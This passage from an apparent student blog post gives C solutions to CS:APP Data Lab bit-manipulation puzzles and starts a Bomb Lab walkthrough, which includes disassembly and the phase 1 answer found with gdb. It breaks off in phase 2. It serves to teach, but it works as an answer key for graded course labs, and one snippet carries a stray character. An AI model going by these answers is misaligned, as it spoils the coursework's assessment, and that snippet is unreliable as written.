<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断 低位第2字节 是否等于0x30 是则返回0</span></span><br><span class="line"><span class="type">int</span> res2 = (x &amp; <span class="number">0xf0</span>)^<span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断 低位第1字节 在+6以后是否不进位 不进位说明在0~9之间 是则返回0</span></span><br><span class="line"><span class="type">int</span> res1 = ((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断其他高位字节 是否等于0 是则返回0</span></span><br><span class="line"><span class="type">int</span> res3 = x &amp; (~<span class="number">0xff</span>);s</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后综合在一起</span></span><br><span class="line"><span class="keyword">return</span> !res1 &amp; !res2 &amp; !res3;</span><br></pre></td></tr></table></figure>

<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7. conditional"></a>7. conditional</h4><p>实现类似<code>x?y:z </code>的条件计算。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = (!x)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> (y | ~mask) &amp; (z | mask) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>x?y:z </code>表示当x为0时返回y，当x不为0时返回z；</p>
<p>（1）先使用<code>！</code>对<code>x</code>进行判断，得到布尔值0或1，再减1可分别得到<code>0xffffffff</code>和<code>0x0</code></p>
<p>（2）构造<code>y | ~mask</code>，此时当mask&#x3D;<code>0xffffffff</code>时取y，当mask&#x3D;<code>0x0</code>时取<code>0xffffffff</code>;对称构造<code>z | mask</code>,此时当mask&#x3D;<code>0xffffffff</code>时取<code>0xffffffff</code>，当mask&#x3D;<code>0x0</code>时取z;用<code>&amp;</code>连接即可满足条件。</p>
<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8. isLessOrEqual"></a>8. isLessOrEqual</h4><p>实现小于等于比较。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取x和y的符号值 默认是算术右移 负数----1111 正数-----0000</span></span><br><span class="line">  <span class="type">int</span> sx = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> sy = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 判断符号是否相同  相同----0000 不同-----1111</span></span><br><span class="line">  <span class="type">int</span> mask = sx ^ sy;</span><br><span class="line">  <span class="comment">// 在符号相同时 判断y-x值的符号 y&lt;x---0000---0 y&gt;=x---1111---1</span></span><br><span class="line">  <span class="type">int</span> sm = (y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 符号不同时 判断sx sx=1111---x&lt;y---1  sx=0000----x&gt;y---0</span></span><br><span class="line">  <span class="keyword">return</span> !!((mask &amp; sx) | (~mask &amp; ~sm));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9. logicalNeg"></a>9. logicalNeg</h4><p>实现逻辑非运算。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ~((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0与其他整数的区别是，0的负数仍然为0，而其他整数求负数后符号改变。这里要考虑一个特例，当x为最小值<code>0x80000000</code>时，x的负数仍然为最小值，最高位虽然不变但是仍为1。综上，除0以外，x和其负数的最高位中必有一个是1。</p>
<p>int类型中负数用补码表示，求补码即反码加一，构造<code>(x | (~x + 1))</code>操作，只有<code>x=0</code>时最高位保持 0，利用这一点，求反后右移保留最高位，检测该位是否为 1 就可以实现逻辑非。</p>
<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10. howManyBits"></a>10. howManyBits</h4><p>计算最少需要多少位可以用补码表示法来表示数<code>x</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是正数，寻找最高位1出现的位置，然后加上一位符号位即可。如果是负数的话，只需要知道最高位 0 出现的位置，再添加一个符号位。所以负数可以先对其取反，然后按照正数操作。</p>
<p>寻找过程为 2 分法，利用<code>!!(x &gt;&gt; bits)</code>来判断该段是否有 1。有则左移至该段，否则不移动即另一端。注意最后 2 位的情况，<code>11</code>和<code>10</code>都会使<code>ans1 = 1</code>且<code>ans0 = 1</code>，事实上只有全 0（数 0）的情况会使<code>ans0 = 0</code>。最后注意需要加上一个符号位，最终答案把移位结果累加<code>ans16 + ans8 + ans4 + ans2 + ans1 + ans0 + 1</code>。</p>
<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11. floatScale2"></a>11. floatScale2</h4><p>实现浮点数乘 2。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分别计算 指数位 符号位 有效位</span></span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="comment">// 分三种情况讨论</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// NaN</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// mult 2</span></span><br><span class="line">    <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | sign;</span><br><span class="line">  <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// overflow Nan</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | sign | frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IEEE标准32位浮点数格式为：最高位 1 位为<strong>符号位</strong>（sign），8 为为<strong>指数位</strong>（exp），剩下的 23 位为<strong>有效位</strong>（frac）。</p>
<p>根据浮点数范围，浮点数乘2需要分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN ，无穷大，乘2仍然返回原参数；</li>
<li><code>exp == 0x00</code>：非规格数，这时候 frac 无起始 1，乘2即将 frac 部分左移 1 位，同时还需要考虑符号，整体运算等价于<code>(uf &lt;&lt; 1) | sign</code></li>
<li><code>exp == others</code>： 规格化情况，先增加指数位，注意这时候判断是否为 0xff 达到无穷大。按位模式组合成新的浮点数输出即可<code>(exp &lt;&lt; 23) | sign | frac</code>。</li>
</ul>
<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12. floatFloat2Int"></a>12. floatFloat2Int</h4><p>将单精度浮点数转化为int类型整数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)             <span class="comment">// NaN or infinity</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// 非规格化数字都是小于1的数 直接返回0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">// 规格化数字</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> frac1 = <span class="number">0x800000</span> | frac; <span class="comment">// 补充小数部分隐含的1</span></span><br><span class="line">    <span class="type">int</span> exp1 = <span class="built_in">exp</span> - <span class="number">127</span>;        <span class="comment">// 减去偏移值得到真实的移码</span></span><br><span class="line">    <span class="comment">// 超过范围的直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">31</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exp1 &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">    <span class="comment">// 在int表示范围内 判断移位方向</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">23</span>)</span><br><span class="line">      frac1 = frac1 &lt;&lt; (exp1 - <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      frac1 = frac1 &gt;&gt; (<span class="number">23</span> - exp1);</span><br><span class="line">    <span class="comment">// 根据符号分别返回</span></span><br><span class="line">    <span class="keyword">if</span> (sign) </span><br><span class="line">      <span class="keyword">return</span> ~frac1 + <span class="number">1</span>; <span class="comment">// 负数则返回其补码</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> frac1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN 或无穷大，直接返回最大值<code>0x80000000</code>；</li>
<li><code>exp == 0x00</code>：非规格化数字，都是小于1的数，直接返回0；</li>
<li><code>exp == others</code>： 规格化情况，先补充隐含的1，frac变为24位，减去偏移值得到真实的移码exp1。<ul>
<li>exp1大于31或者小于0都超过int表示范围，直接返回0。</li>
<li>frac相当于已经左移了23位，需要再判断exp1与23的大小，大于23则还需要左移（exp1-23）位，小于则需要右移（23-exp1）位。</li>
<li>最后根据uf的符号分别返回，正数直接返回移位后的数，负数则返回其补码。</li>
</ul>
</li>
</ul>
<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13. floatPower2"></a>13. floatPower2</h4><p>计算2.0的x次方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221014201052512.png" alt="image-20221014201052512" style="zoom:67%;" />



<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
<li><p>编译时一直有个警告：</p>
<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221014200543586.png" alt="image-20221014200543586"></p>
<p>在”btest.c”文件中对arg_test_range[1]初始化即可解决。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sanity check on the number of args */</span></span><br><span class="line"><span class="keyword">if</span> (args &lt; <span class="number">0</span> || args &gt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Configuration error: invalid number of args (%d) for function 	%s\n&quot;</span>, args, t-&gt;name);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;	</span><br><span class="line">arg_test_range[<span class="number">1</span>] = <span class="number">0</span>; <span class="comment">//添加</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Assign range of argument test vals so as to conserve the total</span></span><br><span class="line"><span class="comment">   number of tests, independent of the number of arguments */</span></span><br><span class="line"><span class="keyword">if</span> (args == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = TEST_RANGE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (args == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = <span class="built_in">pow</span>((<span class="type">double</span>)TEST_RANGE, <span class="number">0.5</span>); <span class="comment">/* sqrt */</span></span><br><span class="line">	arg_test_range[<span class="number">1</span>] = arg_test_range[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试时最后一题一直显示超时，将makefile里的m32改位m64，就可以了。</p>
</li>
</ul>
<h2 id="实验2：二进制炸弹（Bomb-Lab）"><a href="#实验2：二进制炸弹（Bomb-Lab）" class="headerlink" title="实验2：二进制炸弹（Bomb Lab）"></a>实验2：二进制炸弹（Bomb Lab）</h2><h3 id="实验介绍-1"><a href="#实验介绍-1" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>二进制炸弹是一个包含一系列阶段的可执行程序，每个阶段需要你在<code>stdin</code>上输入一个特定的字符串。如果你输入的字符串正确，那么这个阶段就被成功拆除，炸弹进入下一阶段。否则，炸弹会爆炸，并输出”BOOM!!!”,然后终止。当所有的阶段都被成功拆除后炸弹就被拆除。</p>
<h3 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h3><blockquote>
<p>根据“学号后三位%47”领取自己的代码包  <code>137%47=43</code></p>
</blockquote>
<h3 id="实验思路-1"><a href="#实验思路-1" class="headerlink" title="实验思路"></a>实验思路</h3><p>准备工作: 得到汇编代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bomb &gt;&gt; bomb.s</span><br></pre></td></tr></table></figure>

<h4 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048b80 &lt;phase_1&gt;:</span><br><span class="line"> 8048b80:	55                   	push   %ebp</span><br><span class="line"> 8048b81:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048b83:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048b86:	c7 44 24 04 b8 99 04 	movl   $0x80499b8,0x4(%esp)</span><br><span class="line"> 8048b8d:	08 </span><br><span class="line"> 8048b8e:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048b91:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048b94:	e8 66 05 00 00       	call   80490ff &lt;strings_not_equal&gt; </span><br><span class="line"> 8048b99:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048b9b:	74 05                	je     8048ba2 &lt;phase_1+0x22&gt;</span><br><span class="line"> 8048b9d:	e8 24 0b 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048ba2:	c9                   	leave  </span><br><span class="line"> 8048ba3:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>这段程序调用了两个函数，根据名字可以猜测函数的作用。<code>strings_not_equal</code>函数，是比较两个字符串是否相等，然后测试函数的返回值，如果不为0则调用<code>explode_bomb</code>程序引爆炸弹。所以问题是怎么找到对比的字符串。可以看到，在第5行，调用<code>strings_not_equal</code>函数前程序为其分配了一个地址空间<code>0x80499b8</code>，猜测该地址可能为函数<code>strings_not_equal</code>的参数地址，也就是有可能是比对字符串的起始地址。打印地址内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x80499b8</span><br><span class="line">0x80499b8:      &quot;The future will be better tomorrow.&quot;</span><br></pre></td></tr></table></figure>

<p>即可得到第一个炸弹的答案:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The future will be better tomorrow.</span><br></pre></td></tr></table></figure>

<h4 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">08048ba4 &lt;phase_2&gt;:</span><br><span class="line"> 8048ba4:	55                   	push   